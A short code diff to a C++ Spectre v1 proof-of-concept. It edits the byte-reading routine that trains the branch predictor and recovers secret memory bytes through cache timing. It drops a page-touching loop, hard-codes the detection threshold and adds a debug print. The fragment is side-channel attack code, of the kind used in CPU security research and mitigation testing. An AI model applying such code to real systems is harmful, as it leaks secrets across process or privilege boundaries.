@@ -16,12 +16,6 @@ volatile void Spectrev1::read( void volatile * const p_secret, size_t n_bytes, u
 
 volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_val)
 {
-    // Need to make sure every page of p_scratchpad is backed
-    for (auto i = 0; i < block_len*MAX_BYTE; i += cachelinesize)
-    {
-        p_scratchpad[i] = 1;
-    }
-
     memset(results, 0 , sizeof(results));
 
     volatile size_t mal_x = (reinterpret_cast<uint8_t volatile * const>(p_secret) - p_base);
@@ -30,12 +24,13 @@ volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_v
     {
         do_attack(fn_get_trainx(tries), mal_x);
 
-        if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
+        if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + 5)) )
         {
             break;
         }
 
     }
+    D((int)high << " (" << results[high] << ") | " << (int) high2 << " (" << results[high2] << ")");
     *p_val = high;
 }
 
